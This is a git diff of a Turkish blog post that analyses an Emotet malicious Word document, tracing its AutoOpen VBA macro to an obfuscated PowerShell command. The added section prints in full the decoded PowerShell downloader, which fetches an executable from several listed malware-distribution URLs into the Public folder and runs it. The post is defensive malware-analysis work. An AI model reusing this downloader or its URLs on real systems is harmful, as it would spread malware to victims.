@@ -1,4 +1,4 @@
-<<<<<<< HEAD
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -10,7 +10,7 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>w3challs reverse captcha</title>
+    <title>Emotet zararlı yazılım analizi part I</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
@@ -70,14 +70,14 @@
 
     <!-- Page Header -->
     <!-- Set your background image for this header on the line below. -->
-    <header class="intro-header" style="background-image: url('img/post-bg.jpg')">
+    <header class="intro-header" style="background-image: url('img/emotet-wall.jpg')">
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
-                        <h1>Emotet zararlı yazılım analizi part 1</h1>
+                        <h1>Emotet zararlı yazılım analizi part I</h1>
                        <!--<h2 class="subheading">Günümüzün en çok kullanılan ddos önlemlerinden captcha</h2>-->
-                        <span class="meta">Posted by Fuat Fuçucuoğlu<a href="#">, Malwares</a>, 14 Ekim 2019</p>
+                        <span class="meta">Posted by Fuat Fuçucuoğlu<a href="#">, Malwares</a>, 11 Aralık 2019</p>
                     </div>
                 </div>
             </div>
@@ -89,77 +89,103 @@
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-					<h1>Emotet zararlı yazılım analizi part 1</h1>
+					<h1>Emotet zararlı yazılım analizi part I</h1>
                     <p>Merhaba<br />
-                    Bu seride emotet zararlı yazılımını baştan sona inceleyeceğiz. Emotet zararlısının birkaç farklı varyasyonu var.Bu yazıda aşağıdaki hashe sahip dokümanı inceleyeceğiz.<br />
+                    Bu seride emotet zararlı yazılımını ve atak vektörünü baştan sona araştıracağız. Bu yazıda loader kısmını, ikinci yazıda binary kısmını inceleyeceğiz. Emotet zararlısının birçok farklı varyasyonu var. Bu yazıda aşağıdaki hashe sahip dokümanı inceleyeceğiz.<br />
                     File: PAYMENT 225EWF.doc<br />
                     MD5: e8e468710c0a4f0906305c435a761902<br />
                     SHA-256: 707fedfeadbfa4248cfc6711b5a0b98e1684cd37a6e0544e9b7bde4b86096963<br />
-                    Zararlı malsharede mevcut. Microsoft office uygulamalarıyla açtığımızda çalıştırılmayı bekleyen bir macro kodu karşımıza çıkıyor.
+                    Zararlı Malshare'de mevcut. Microsoft office uygulamalarıyla açtığımızda karşımıza çalıştırılmayı bekleyen bir macro kodu karşımıza çıkıyor.
  
 </p>                
                     <a href="#">
                         <img class="img-responsive" src="img/emopart1i1.png" alt="">
                     </a>
-                    <p>Microsof word'un macrolar kısmına geldiğimizde autoOpen adında bi macro bizi karşılıyor.Burası makronun başlangıç noktası.</p>
+                    <p>Microsof word'un macrolar kısmına geldiğimizde autoOpen adında bir macro bizi karşılıyor. Burası makronun başlangıç noktası.</p>
                     <a href="#">
                         <img class="img-responsive" src="img/emopart1i2.png" alt="">
                     </a>
 
 
-                   <p> AutoOpen fonksiyonunu seçip düzenle butonuna bastığımızda fonksiyonun olduğu yere varıyoruz. Vba script kodunu incelediğimizde obfuscate edildiğini görüyoruz.Aplication.run haricinde dikkat çeken bir detay görünmüyor.Diğer satırlarda da sadece değişkenlere değer atanmış. Peki application.run satırında ne oluyor?
+                   <p> AutoOpen fonksiyonunu seçip düzenle butonuna bastığımızda fonksiyonun olduğu yere varıyoruz. Vba script kodunu incelediğimizde obfuscate edildiğini görüyoruz. Aplication.run haricinde dikkat çeken bir detay görünmüyor. Diğer satırlarda da sadece değişkenlere değer atanmış. Peki application.run satırında ne oluyor?
 <br/>
-   "ndUzTzJ" değerini proje içinde arattiğimizda bunun string argümanı alan bir fonksiyon olduğunu görüyoruz.Burdaki string argümanı "DsPBkKtzcIwF".
- <br/>Yine "DsPBkKtzcIwF" değerini proje içinde arattiğimizda da bir fonksiyona ulaşıyoruz.Neyse ki bizim için önemli olan bu fonksiyonun ne döndürdüğü. Basitçe debug.print (DsPBkKtzcIwF) yaparak fonksiyonun ne döndürdüğünü görebilirliz.
+   "ndUzTzJ" değerini proje içinde arattığımızda bunun string argümanı alan bir fonksiyon olduğunu görüyoruz. Burdaki string argümanı "DsPBkKtzcIwF".
+ <br/>Yine "DsPBkKtzcIwF" değerini proje içinde arattığımızda da bir fonksiyona ulaşıyoruz. Neyse ki bizim için önemli olan bu fonksiyonun ne döndürdüğü. Basitçe debug.print (DsPBkKtzcIwF) yaparak fonksiyonun ne döndürdüğünü görebiliriz.
 
 
                  <a href="#">
                         <img class="img-responsive" src="img/emopart1i3.png" alt="">
                     </a>
 
-                    <p>Argümani bulduk şimdi asıl fonksiyonu("ndUzTzJ") inceleyelim.</p>
+                    <p>Argümanı bulduk şimdi asıl fonksiyonu("ndUzTzJ") inceleyelim.</p>
                     <a href="#">
                         <img class="img-responsive" src="img/emopart1i4.png" alt="">
                     </a>
-                    <p>Bu fonksiyonda da createobject satırı dikkat çekiyor.Ayrıca az önce bulduğumuz argüman "nbDfkaTi" adında bu satırda kullanılmış.
+                    <p>Bu fonksiyonda da createobject satırı dikkat çekiyor. Ayrıca az önce bulduğumuz argüman "nbDfkaTi" adında bu satırda kullanılmış.
 </p>
                     <a href="#">
                         <img class="img-responsive" src="img/emopart1i5.png" alt="">
                     </a>
 
                     <p>
-Ve sonunda çalıştırılacak komuta ulaştık. createobject("Wscript.Shell").run ile print ettiğimiz komut çalıştırılıyor.Şimdi procces explorer ve procces monitor ile programı çalıştırma zamanında inceleyelim.Wordde macrolari etkinleştirip çalıltırdığımızda 3 işlem oluşuyor.Bunların ikisi cmd diğeri powershell.Bu proccessleri suspend edip inceliyoruz.Cmdde bizim bulduğumuz komut çalışıyor.Powershellde ise komutun başı değişmiş.Demek ki komut arkada powershelli açmış.Procces monitor ile powershell proccesini inceliyoruz.</p>
+Ve sonunda çalıştırılacak komuta ulaştık. createobject("Wscript.Shell").run ile print ettiğimiz komut çalıştırılıyor. Şimdi procces explorer ve procces monitor ile programı çalıştırma zamanında inceleyelim. Wordde macroları etkinleştirip çalıltırdığımızda 3 işlem oluşuyor. Bunların ikisi cmd diğeri powershell. Bu proccessleri suspend edip inceliyoruz. Cmdde bizim bulduğumuz komut çalışıyor. Powershellde ise komutun başı değişmiş. Demek ki komut arkada powershelli açmış. Procces monitor ile powershell proccesini inceliyoruz.</p>
     
                       <a href="#">
                         <img class="img-responsive" src="img/emopart1i6.png" alt="">
                     </a>
 
-                    <p>Artık elimizde daha düzgün bir komut var ama işimiz hala bitmedi. Part 2 de bu komutu inceleyeceğiz.
+                    <p>Artık elimizde daha düzgün bir komut var .Şimdi bu komutu inceleyelim.
+                    </p>
+<p>powershell  " ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe([RUNtIme.intEropseRVICEs.MarShal]::SeCURestrINgtogLoBaLaLloCUnicOde( $('76492d1116743f0423413b16050a5345MgB8ADYA……………………QA3AGQAOABhADYANgAwADUAMABkAGYAOQBmAGQAMwA=' |cOnvErtto-SeCureSTrINg  -K (35..4)))))| . ( $VERBosePreFERENcE.TOStrIng()[1,3]+'x'-joIn'')
+</p>   
+<p> Tırnak içindeki text dotnet securestring classı'ı ile encryptlenmiş.
+ Decrypt etmek için basit bit script yazıyoruz.</p>
+ <a href="#">
+                        <img class="img-responsive" src="img/emopart2i1.png" alt="">
+                    </a>
+              
+             
+                    <br>
+                    <code>$nsadasd = &('n'+'e'+'w-objec'+'t') random;$YYU = .('ne'+'w'+'-object') System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = '
+http://lecap-services.fr/wiB9s/?http://nikitinskysport.ru/R5ytZ/?http://beauty-tea.com/hB2JAMO/?http://zekiatagur.com/gCWu/?http://arkonziv.com/Site7_Pixelhobbi
+es/iV1PKqL/'.Split('?');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&('Invo'+'k
+'+'e-Item')($SDC);break;}catch{}}</code>
+
+<p>Ve sonuç yine obfuscate bir string.</p>
+    
+
+                 
+
+
+                    <p>
+                        
+
+Neyse ki bu o kadar da karmaşık değil. Belli ki belirli urllerden dosya indirip çalıştırıyor.
+ İçinden urlleri ayırmamız gerek sadece. Urlleri bir string içinde tutup '?' ile ayırdığı açıkça görünüyor.
+<code>$env:public</code> : <code>"C:\Users\Public"</code> stringini verir 
+ardından <code>$env:public + '\' + $NSB + ('.ex'+'e') </code>satırında 
+C:\Users\Public\$NSB.exe adında bir executable oluşturulmuş 
+$NSB aşağıdaki komuttan anlaşılacağı üzere 10000, 282133 arasında random bir değer.<code>
+$NSB = $nsadasd.next(10000, 282133)
+$nsadasd = &('n'+'e'+'w-objec'+'t') random</code>
+
                     </p>
 
+                     <a href="#">
+                        <img class="img-responsive" src="img/emopart2i3.png" alt="">
+                    </a>
+
+                    <p>Macroları açıp kodu çalıştırdığımızda görüldüğü üzere public klasörü içinde bir executable oluşuyor , ancak 0 kb. Bunun sebebi linklerin artık geçersiz olması.
+
+</p>
 
 
 
+                     <a href="#">
+                        <img class="img-responsive" src="img/emopart2i4.png" alt="">
+                    </a>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+                    <p>Sonraki yazıda indirilecek olan executable binary'i inceleyeceğiz.</p>
 
 
 
@@ -209,216 +235,4 @@ Ve sonunda çalıştırılacak komuta ulaştık. createobject("Wscript.Shell").r
 </body>
 
 </html>
-=======
-<!DOCTYPE html>
-<html lang="en">
 
-<head>
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="author" content="">
-
-    <title>emotet zararlı yazılım analizi</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-
-    <!-- Theme CSS -->
-    <link href="css/clean-blog.min.css" rel="stylesheet">
-
-    <!-- Custom Fonts -->
-    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-</head>
-
-<body>
-
-    <!-- Navigation -->
-    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
-        <div class="container-fluid">
-            <!-- Brand and toggle get grouped for better mobile display -->
-            <div class="navbar-header page-scroll">
-                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
-                    <span class="sr-only">Toggle navigation</span>
-                    Menu <i class="fa fa-bars"></i>
-                </button>
-                <a class="navbar-brand" href="index.html">ffucucuoglu</a>
-            </div>
-
-            <!-- Collect the nav links, forms, and other content for toggling -->
-            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
-                <ul class="nav navbar-nav navbar-right">
-                    <li>
-                        <a href="index.html">Home</a>
-                    </li>
-                    <li>
-                        <a href="about.html">About</a>
-                    </li><!--
-                    <li>
-                        <a href="post.html">Sample Post</a>
-                    </li>-->
-                    <li>
-                        <a href="contact.html">Contact</a>
-                    </li>
-                </ul>
-            </div>
-            <!-- /.navbar-collapse -->
-        </div>
-        <!-- /.container -->
-    </nav>
-
-    <!-- Page Header -->
-    <!-- Set your background image for this header on the line below. -->
-    <header class="intro-header" style="background-image: url('img/emopart1wall.jpg')">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                    <div class="post-heading">
-                        <h1>Emotet zararlı yazılım analizi part 1</h1>
-                       <!--<h2 class="subheading">Günümüzün en çok kullanılan ddos önlemlerinden captcha</h2>-->
-                        <span class="meta">Posted by Fuat Fuçucuoğlu<a href="#">, Malwares</a>, 14 Ekim 2019</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-
-    <!-- Post Content -->
-    <article>
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-					<h1>Emotet zararlı yazılım analizi part 1</h1>
-                    <p>Merhaba<br />
-                    Bu seride emotet zararlı yazılımını baştan sona inceleyeceğiz. Emotet zararlısının birkaç farklı varyasyonu var.Bu yazıda aşağıdaki hashe sahip dokümanı inceleyeceğiz.<br />
-                    File: PAYMENT 225EWF.doc<br />
-                    MD5: e8e468710c0a4f0906305c435a761902<br />
-                    SHA-256: 707fedfeadbfa4248cfc6711b5a0b98e1684cd37a6e0544e9b7bde4b86096963<br />
-                    Zararlı malsharede mevcut. Microsoft office uygulamalarıyla açtığımızda çalıştırılmayı bekleyen bir macro kodu karşımıza çıkıyor.
- 
-</p>                
-                    <a href="#">
-                        <img class="img-responsive" src="img/emopart1i1.png" alt="">
-                    </a>
-                    <p>Microsof word'un macrolar kısmına geldiğimizde autoOpen adında bi macro bizi karşılıyor.Burası makronun başlangıç noktası.</p>
-                    <a href="#">
-                        <img class="img-responsive" src="img/emopart1i2.png" alt="">
-                    </a>
-
-
-                   <p> AutoOpen fonksiyonunu seçip düzenle butonuna bastığımızda fonksiyonun olduğu yere varıyoruz. Vba script kodunu incelediğimizde obfuscate edildiğini görüyoruz.Aplication.run haricinde dikkat çeken bir detay görünmüyor.Diğer satırlarda da sadece değişkenlere değer atanmış. Peki application.run satırında ne oluyor?
-<br/>
-   "ndUzTzJ" değerini proje içinde arattiğimizda bunun string argümanı alan bir fonksiyon olduğunu görüyoruz.Burdaki string argümanı "DsPBkKtzcIwF".
- <br/>Yine "DsPBkKtzcIwF" değerini proje içinde arattiğimizda da bir fonksiyona ulaşıyoruz.Neyse ki bizim için önemli olan bu fonksiyonun ne döndürdüğü. Basitçe debug.print (DsPBkKtzcIwF) yaparak fonksiyonun ne döndürdüğünü görebilirliz.
-
-
-                 <a href="#">
-                        <img class="img-responsive" src="img/emopart1i3.png" alt="">
-                    </a>
-
-                    <p>Argümani bulduk şimdi asıl fonksiyonu("ndUzTzJ") inceleyelim.</p>
-                    <a href="#">
-                        <img class="img-responsive" src="img/emopart1i4.png" alt="">
-                    </a>
-                    <p>Bu fonksiyonda da createobject satırı dikkat çekiyor.Ayrıca az önce bulduğumuz argüman "nbDfkaTi" adında bu satırda kullanılmış.
-</p>
-                    <a href="#">
-                        <img class="img-responsive" src="img/emopart1i5.png" alt="">
-                    </a>
-
-                    <p>
-Ve sonunda çalıştırılacak komuta ulaştık. createobject("Wscript.Shell").run ile print ettiğimiz komut çalıştırılıyor.Şimdi procces explorer ve procces monitor ile programı çalıştırma zamanında inceleyelim.Wordde macrolari etkinleştirip çalıltırdığımızda 3 işlem oluşuyor.Bunların ikisi 
-			    diğeri powershell.Bu proccessleri suspend edip inceliyoruz.Cmd'de bizim bulduğumuz komut çalışıyor.Powershell'de ise komutun başı değişmiş.Demek ki komut arkada powershell'i açmış.Procces monitor ile powershell proccesini inceliyoruz.</p>
-    
-                      <a href="#">
-                        <img class="img-responsive" src="img/emopart1i6.png" alt="">
-                    </a>
-
-                    <p>Artık elimizde daha düzgün bir komut var ama işimiz hala bitmedi. Part 2 de bu komutu inceleyeceğiz.
-                    </p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                </div>
-            </div>
-        </div>
-    </article>
-
-    <hr>
-
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                    <ul class="list-inline text-center">
-                    
-                        <li>
-                            <a href="https://github.com/ffucucuoglu">
-                                <span class="fa-stack fa-lg">
-                                    <i class="fa fa-circle fa-stack-2x"></i>
-                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-                                </span>
-                            </a>
-                        </li>
-                    </ul>
-                    <p class="copyright text-muted">Copyright &copy; ffucucuoglu 2019</p>
-                </div>
-            </div>
-        </div>
-    </footer>
-
-    <!-- jQuery -->
-    <script src="vendor/jquery/jquery.min.js"></script>
-
-    <!-- Bootstrap Core JavaScript -->
-    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
-
-    <!-- Contact Form JavaScript -->
-    <script src="js/jqBootstrapValidation.js"></script>
-    <script src="js/contact_me.js"></script>
-
-    <!-- Theme JavaScript -->
-    <script src="js/clean-blog.min.js"></script>
-
-</body>
-
-</html>
->>>>>>> 3174835b5cacf3a300804be06bbdc7d430e23916
